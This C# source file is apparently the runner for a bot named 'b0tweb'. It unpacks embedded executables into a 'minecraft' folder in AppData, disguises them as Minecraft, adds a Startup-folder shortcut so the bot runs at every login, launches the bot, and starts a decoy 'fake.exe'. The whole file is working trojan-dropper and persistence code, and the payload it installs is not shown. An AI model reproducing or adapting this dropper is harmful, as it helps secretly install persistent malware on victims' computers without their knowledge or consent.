using System;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Runtime.InteropServices.ComTypes;
using System.Text;

namespace b0tweb_runner
{
    class Program
    {
        [ComImport]
        [Guid("00021401-0000-0000-C000-000000000046")]
        internal class ShellLink
        {
        }

        [ComImport]
        [InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
        [Guid("000214F9-0000-0000-C000-000000000046")]
        internal interface IShellLink
        {
            void GetPath([Out, MarshalAs(UnmanagedType.LPWStr)] StringBuilder pszFile, int cchMaxPath, out IntPtr pfd, int fFlags);
            void GetIDList(out IntPtr ppidl);
            void SetIDList(IntPtr pidl);
            void GetDescription([Out, MarshalAs(UnmanagedType.LPWStr)] StringBuilder pszName, int cchMaxName);
            void SetDescription([MarshalAs(UnmanagedType.LPWStr)] string pszName);
            void GetWorkingDirectory([Out, MarshalAs(UnmanagedType.LPWStr)] StringBuilder pszDir, int cchMaxPath);
            void SetWorkingDirectory([MarshalAs(UnmanagedType.LPWStr)] string pszDir);
            void GetArguments([Out, MarshalAs(UnmanagedType.LPWStr)] StringBuilder pszArgs, int cchMaxPath);
            void SetArguments([MarshalAs(UnmanagedType.LPWStr)] string pszArgs);
            void GetHotkey(out short pwHotkey);
            void SetHotkey(short wHotkey);
            void GetShowCmd(out int piShowCmd);
            void SetShowCmd(int iShowCmd);
            void GetIconLocation([Out, MarshalAs(UnmanagedType.LPWStr)] StringBuilder pszIconPath, int cchIconPath, out int piIcon);
            void SetIconLocation([MarshalAs(UnmanagedType.LPWStr)] string pszIconPath, int iIcon);
            void SetRelativePath([MarshalAs(UnmanagedType.LPWStr)] string pszPathRel, int dwReserved);
            void Resolve(IntPtr hwnd, int fFlags);
            void SetPath([MarshalAs(UnmanagedType.LPWStr)] string pszFile);
        }

        static void Main(string[] args)
        {
            // Create all files
            string appdata = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
            string path = Path.Combine(appdata, "minecraft");
            Directory.CreateDirectory(path);

            foreach (string item in Assembly.GetExecutingAssembly().GetManifestResourceNames())
            {
                string[] parts = item.Split('.');
                string itemPath = path;

                if (parts[1] != "b0tweb")
                {
                    itemPath = Path.Combine(path, parts[1]);
                }

                if (!Directory.Exists(itemPath))
                {
                    Directory.CreateDirectory(itemPath);
                }

                string fileName = item.Remove(0, parts[0].Length + parts[1].Length + 2);
                Stream stream = Assembly.GetExecutingAssembly().GetManifestResourceStream(item);

                FileStream fileStream = new FileStream(Path.Join(itemPath, fileName), FileMode.Create);
                for (int i = 0; i < stream.Length; i++)
                {
                    fileStream.WriteByte((byte)stream.ReadByte());
                }
                  
                fileStream.Close();
            }

            IShellLink link = (IShellLink)new ShellLink();
            // setup shortcut information
            link.SetDescription("Minecraft");
            link.SetPath(Path.Combine(path, "b0tweb.exe"));
            // save it
            IPersistFile file = (IPersistFile)link;
            file.Save(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Startup), "minecraft.lnk"), false);

            Process.Start(Path.Combine(path, "b0tweb.exe"));
            // Launch the "hidden" application
            Process.Start(Path.Combine(path, "faker", "fake.exe"));
        }
    }
}
